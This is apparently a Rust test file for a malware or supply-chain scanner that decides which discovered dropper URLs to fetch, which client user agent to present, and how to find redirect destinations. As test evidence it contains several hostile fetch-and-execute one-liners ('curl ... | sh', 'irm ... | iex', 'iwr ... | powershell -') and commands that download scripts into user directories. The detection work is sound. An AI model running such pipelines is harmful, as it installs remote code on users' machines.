//! Which discovered URLs are fetched, and as which client.

use super::*;

#[test]
fn discovered_url_filter_keeps_download_shapes_and_drops_sites_and_endpoints() {
    for url in [
        "https://downloads.example.test/stage-2.sh",
        "https://cdn.example.test/releases/download/v1/payload",
        "https://api.telegram.org/file/bot123/documents/payload.exe",
        "https://huggingface.co/o/m/resolve/main/payload.bin",
        "https://example.test/archive/payload.tar.gz?sig=abc",
        "https://example.test/payload.js",
    ] {
        assert!(dropper(url), "download-shaped URL was rejected: {url}");
    }

    for url in [
        "https://example.test",
        "https://example.test/",
        "https://example.test/docs/",
        "https://example.test/download",
        "https://example.test/download?file=stage.sh",
        "https://api.example.test/v1/models",
        "https://example.test/api/v1/query",
        "https://example.test/graphql",
        "https://example.test/index.html",
        "https://example.test/result.json",
        "https://example.test/submit.php?id=1",
        "https://example.test/download/index.html",
        "https://example.test/file%2Ezip",
        "ftp://example.test/stage-2.sh",
        // A trailing `/` names a directory; the response is an index or a
        // landing page. This is the shape that pulled PyPI project pages.
        "https://pypi.org/project/diffusers/0.40.0/",
        "https://example.test/releases/v1.2.3/",
        // A version is not a filename, with or without the trailing slash.
        "https://pypi.org/project/diffusers/0.40.0",
        "https://github.com/foo/bar/releases/tag/v1.2.3",
        "https://api.example.test/v2.1",
        "https://example.test/lib/1.2.3/",
        "https://example.test/pkg/2.0.0",
    ] {
        assert!(!dropper(url), "site/API-shaped URL was kept: {url}");
    }
}

#[test]
fn eval_pipeline_urls_are_followed_even_without_a_filename() {
    let mut reference = url_ref("https://cdn.jsdelivr.net/gh/example/stage-opaque");
    reference.evidence = "irm cdn.jsdelivr.net/gh/example/stage-opaque | iex".to_string();
    assert!(!dropper("https://cdn.jsdelivr.net/gh/example/stage-opaque"));
    assert!(is_eval_pipeline_url(&reference));

    reference.evidence = "curl jsonkeeper.com/abc123 | iex".to_string();
    assert!(is_eval_pipeline_url(&reference));

    reference.evidence = "curl jsonkeeper.com/abc123 | sh".to_string();
    assert!(is_eval_pipeline_url(&reference));

    reference.evidence = "wget cdn.jsdelivr.net/gh/example/stage | bash".to_string();
    assert!(is_eval_pipeline_url(&reference));

    reference.evidence = "curl --ssl-no-revoke -L https://example.test/opaque | cmd".to_string();
    assert!(is_eval_pipeline_url(&reference));

    reference.evidence = "iwr https://example.test/opaque | powershell -".to_string();
    assert!(is_eval_pipeline_url(&reference));

    reference.evidence = "curl https://example.test/stage-opaque".to_string();
    assert!(!is_eval_pipeline_url(&reference));
}

#[test]
fn download_to_file_urls_are_followed_even_from_an_api_route() {
    let url = "https://example.vercel.app/api/settings/bootstrap";
    assert!(!dropper(url));
    let mut reference = url_ref(url);
    for evidence in [
        r#"wget -q -O "$DIR/boot.sh" "https://example.vercel.app/api/settings/bootstrap""#,
        r#"curl -s -L -o "$HOME/.vscode/boot.sh" "https://example.vercel.app/api/settings/bootstrap""#,
        "curl -sLo boot.sh https://example.vercel.app/api/settings/bootstrap",
        "curl --output=boot.sh https://example.vercel.app/api/settings/bootstrap",
        "curl -O https://example.vercel.app/api/settings/bootstrap",
        "Invoke-WebRequest -Uri https://example.vercel.app/api/settings/bootstrap -OutFile b.cmd",
    ] {
        reference.evidence = evidence.to_string();
        assert!(is_download_to_file_url(&reference), "{evidence}");
    }
    for evidence in [
        "wget -qO- https://example.vercel.app/api/settings/bootstrap",
        "curl -o - https://example.vercel.app/api/settings/bootstrap",
        "curl -s https://example.vercel.app/api/settings/bootstrap && unzip -o x.zip",
        "echo -o https://example.vercel.app/api/settings/bootstrap",
    ] {
        reference.evidence = evidence.to_string();
        assert!(!is_download_to_file_url(&reference), "{evidence}");
    }
}

#[test]
fn url_fetches_present_their_commands_client() {
    let mut reference = url_ref("https://example.test/stage");
    for (evidence, agent) in [
        (
            "curl.exe -sL https://example.test/stage | cmd",
            Some(CURL_USER_AGENT),
        ),
        (
            "wget -qO- 'https://example.test/stage' | sh",
            Some(WGET_USER_AGENT),
        ),
        (
            "irm https://example.test/stage | iex",
            Some(POWERSHELL_USER_AGENT),
        ),
        ("https://example.test/stage", None),
    ] {
        reference.evidence = evidence.to_string();
        assert_eq!(client_user_agent(&reference), agent, "{evidence}");
    }
    REDIRECT_DESTINATION_SOURCE.clone_into(&mut reference.source);
    assert_eq!(client_user_agent(&reference), Some(CURL_USER_AGENT));
    assert_eq!(client_user_agent(&purl_ref("pkg:npm/curl@1.0.0")), None);
}

#[test]
fn redirect_pages_name_their_destination() {
    // A URL-shortener safety interstitial served in place of a 3xx.
    let interstitial = br#"<!DOCTYPE html><html><head>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
            </head><body><a href="/?utm_source=safety-page">Return to Safety</a>
            <input id="long_url" type=hidden value="https://stage.example.test/api/settings/linux"></input>
            <script>let longUrl = "https:\/\/stage.example.test\/api\/settings\/linux"</script>
            </body></html>"#;
    assert_eq!(
        redirect_destinations(interstitial),
        ["https://stage.example.test/api/settings/linux"]
    );

    let refresh = br#"<html><head><meta http-equiv="Refresh" content="0; URL='https://a.example.test/x?a=1&amp;b=2'"></head></html>"#;
    assert_eq!(
        redirect_destinations(refresh),
        ["https://a.example.test/x?a=1&b=2"]
    );

    let script = br#"<html><script>if (a == b) {} window.location.replace("https://b.example.test/next"); location.href = 'https://c.example.test/';</script></html>"#;
    assert_eq!(
        redirect_destinations(script),
        ["https://b.example.test/next", "https://c.example.test/"]
    );

    // Ordinary pages, relative targets, visible inputs, and non-HTML text
    // name no destination.
    for page in [
            &br#"<html><body><a href="https://d.example.test/">link</a><input type="text" name="url" value="https://e.example.test/"></body></html>"#[..],
            br#"<html><script>location = "/login";</script></html>"#,
            br#"curl -L https://f.example.test/ | sh  # <meta http-equiv=refresh content="0;url=https://g.example.test/">"#,
        ] {
            assert!(redirect_destinations(page).is_empty());
        }
}

/// A page of unclosed tag openers must cost one pass, not one pass per
/// opener.
#[test]
fn redirect_tag_scan_is_linear() {
    let mut hostile = b"<html>".to_vec();
    while hostile.len() < REDIRECT_PAGE_MAX_BYTES - 64 {
        hostile.extend_from_slice(b"<input <meta ");
    }
    hostile.push(b'>');
    let started = std::time::Instant::now();
    assert!(redirect_destinations(&hostile).is_empty());
    assert!(started.elapsed() < std::time::Duration::from_secs(5));
}

#[test]
fn redirect_destinations_are_marked_for_the_fetch_gate() {
    let page = br#"<!doctype html><input type="hidden" name="target_url" value="https://h.example.test/opaque">
            <script>let u = "https:\/\/i.example.test\/escaped"; location.assign(u);</script>
            <meta http-equiv="refresh" content="3;url=https://i.example.test/escaped">"#;
    let mut refs = vec![
        url_ref("https://h.example.test/opaque"),
        url_ref("https://j.example.test/asset.css"),
    ];
    mark_redirect_destinations(page, &mut refs);
    let sources: Vec<(String, &str)> = refs
        .iter()
        .map(|r| (locator(r).to_owned(), r.source.as_str()))
        .collect();
    assert_eq!(
        sources,
        [
            (
                "https://h.example.test/opaque".to_string(),
                REDIRECT_DESTINATION_SOURCE
            ),
            ("https://j.example.test/asset.css".to_string(), "test"),
            (
                "https://i.example.test/escaped".to_string(),
                REDIRECT_DESTINATION_SOURCE
            ),
        ]
    );
}

#[test]
fn discovered_urls_need_a_domain_or_ip_host() {
    for url in ["https://example.com/stage.sh", "http://8.8.8.8/payload.bin"] {
        assert!(valid_host(url), "valid host was rejected: {url}");
    }
    for url in [
        "http://wpad/wpad.dat",
        "http://localhost/payload.bin",
        "http://%@:%u/rfc2585/%@.crl",
        "http://10.0.0.1/payload.bin",
        "http://100.64.0.1/payload.bin",
        "http://172.16.0.1/payload.bin",
        "http://192.168.1.1/payload.bin",
        "http://192.0.2.1/payload.bin",
        "http://127.0.0.1/payload.bin",
        "http://[::1]/payload.bin",
        "http://[fd00::1]/payload.bin",
        "http://[fe80::1]/payload.bin",
        "/relative/payload.bin",
        "relative/payload.bin",
    ] {
        assert!(
            !valid_host(url),
            "invalid or local host was accepted: {url}"
        );
    }
}

#[test]
fn discovered_urls_with_unexpanded_templates_are_skipped() {
    for url in [
        "https://github.com/$REPO/releases/latest",
        "https://api.github.com/repos/$REPO/releases/latest",
        "https://github.com/$REPO/releases/download/v$VERSION",
        "https://github.com/$REPO.git",
        "https://bitbucket.org/${this.repositoryId}/raw/${r}/${e}",
        "https://gitlab.com/${this.repositoryId}/raw/${r}/${e}",
    ] {
        assert!(
            has_unexpanded_url_placeholder(url),
            "unexpanded template was not recognized: {url}"
        );
    }
    // Brace templates, the form a build script or Rust `format!` leaves
    // behind, are placeholders too.
    for url in [
        "https://github.com/solana-labs/solana/releases/download/v{version}/",
        "https://github.com/anza-xyz/platform-tools/releases/download/{version}/{}",
        "https://github.com/otter-sec/anchor/releases/download/v{version}/anchor-{target}{ext}",
    ] {
        assert!(
            has_unexpanded_url_placeholder(url),
            "unexpanded template was not recognized: {url}"
        );
    }
    // printf-family templates, which reach a URL through a `format!` or an
    // f-string that was never applied.
    for url in [
        "https://evil.test/download/%s/tool.tar.gz",
        "https://evil.test/releases/%(version)s/tool.tar.gz",
        "https://evil.test/v%d/tool.tar.gz",
    ] {
        assert!(
            has_unexpanded_url_placeholder(url),
            "unexpanded template was not recognized: {url}"
        );
    }
    // A real percent-escape is not a placeholder.
    for url in [
        "https://github.com/atomdrift-project/scan/releases/download/v2.8.0/atomscan",
        "https://evil.test/path%20with%20spaces/tool.tar.gz",
        "https://registry.npmjs.org/%40scope/pkg/-/pkg-1.0.0.tgz",
    ] {
        assert!(
            !has_unexpanded_url_placeholder(url),
            "a well-formed URL was rejected as a template: {url}"
        );
    }
}

/// A download route names the file after it. When the route word *is* the
/// last component the URL is a listing endpoint, and fetching it costs a
/// round trip to learn nothing.
#[test]
fn a_download_route_as_the_basename_is_a_listing_endpoint() {
    for url in [
        "https://api.github.com/repos/otter-sec/anchor/releases",
        "https://example.test/project/downloads",
        "https://example.test/bucket/files",
    ] {
        assert!(
            !dropper(url),
            "listing endpoint accepted as a download: {url}"
        );
    }
    assert!(dropper(
        "https://github.com/atomdrift-project/scan/releases/download/v2.8.0/atomscan"
    ));
}

#[test]
fn version_shape_does_not_swallow_real_filenames() {
    // Versions — rejected as download targets.
    for v in ["0.40.0", "v2.1", "V10.0.1", "2.1"] {
        assert!(is_version_shaped(v), "version not recognized: {v}");
    }
    // Not versions: a real artifact whose name merely contains digits and
    // dots must still be fetchable. A Go module's pseudo-version filename
    // is the case that matters — mistaking it for a version stops the
    // module being fetched at all.
    for v in [
        "v0.0.0-20260823143148-1fb3b878e2fb.zip",
        "diffusers-0.0.1.tar.gz",
        "payload.exe",
        "stage-2.sh",
        "v1",
        "1",
        "lib.so.6",
        ".2.3",
        "1.2.",
        "",
    ] {
        assert!(!is_version_shaped(v), "filename misread as version: {v}");
    }
    // The versioned artifacts themselves stay fetchable end to end.
    for url in [
        "https://files.pythonhosted.org/packages/a0/05/x/diffusers-0.0.1.tar.gz",
        "https://example.test/releases/v1.2.3/payload.bin",
        "https://proxy.golang.org/github.com/o/r/@v/v0.0.0-20260823143148-1fb3b878e2fb.zip",
    ] {
        assert!(dropper(url), "versioned artifact was rejected: {url}");
    }
}

#[test]
fn provenance_documents_yield_their_subject_not_their_catalogue() {
    // A forage sidecar: one artifact named by `fetch.url`, wrapped around a
    // provider response that lists every release of the project.
    let doc = serde_json::json!({
        "fetch": {"url": "https://files.example.test/pkg-1.0.tar.gz"},
        "artifact": {"sha256": "A".repeat(64), "filename": "pkg-1.0.tar.gz"},
        "registry": {
            "url": "https://files.example.test/pkg-1.0.tar.gz",
            "raw": [
                {"url": "https://files.example.test/pkg-0.0.1.tar.gz"},
                {"url": "https://files.example.test/pkg-0.0.2.tar.gz"}
            ]
        }
    });
    let bytes = serde_json::to_vec(&doc).expect("serialize");
    let subject = provenance_subject(&bytes).expect("subject reference");
    assert_eq!(
        subject.locator,
        RefLocator::Url("https://files.example.test/pkg-1.0.tar.gz".into()),
        "the catalogue must not supply the reference"
    );
    // The recorded digest pins the fetch.
    assert_eq!(
        subject.content_sha256.as_deref(),
        Some("a".repeat(64).as_str())
    );
    assert_eq!(subject.kind, RefKind::UrlFetch);

    // Both provenance shapes are recognized; an ordinary JSON root is not.
    assert!(is_provenance_document("json", "pkg-1.0.tar.gz.forage.json"));
    assert!(is_provenance_document(
        "registry",
        "left-pad@1.3.0.registry.json"
    ));
    assert!(!is_provenance_document("json", "package.json"));
    assert!(!is_provenance_document("json", "forage.json.txt"));

    // A document with no subject yields nothing rather than falling back to
    // the catalogue.
    let empty =
        serde_json::to_vec(&serde_json::json!({"registry": {"raw": []}})).expect("serialize");
    assert!(provenance_subject(&empty).is_none());
}

/// IPv6 literals are judged by address, not refused for their brackets,
/// and only a *mapped* IPv4 address is read as IPv4.
#[test]
fn ipv6_literals_are_judged_by_address() {
    assert!(valid_host("http://[2606:4700:4700::1111]/payload.bin"));
    assert!(
        valid_host("http://[::ffff:8.8.8.8]/payload.bin"),
        "mapped public v4"
    );
    assert!(
        !valid_host("http://[::ffff:10.0.0.1]/payload.bin"),
        "mapped private v4"
    );
    assert!(
        !valid_host("http://[2001:db8::1]/payload.bin"),
        "documentation range"
    );
    let ip = |s: &str| s.parse::<std::net::IpAddr>().unwrap();
    assert!(!public_ip(ip("::1")), "loopback, never the IPv4 0.0.0.1");
    assert!(!public_ip(ip("::")));
    assert!(public_ip(ip("::8.8.8.8")), "IPv4-compatible is plain IPv6");
}
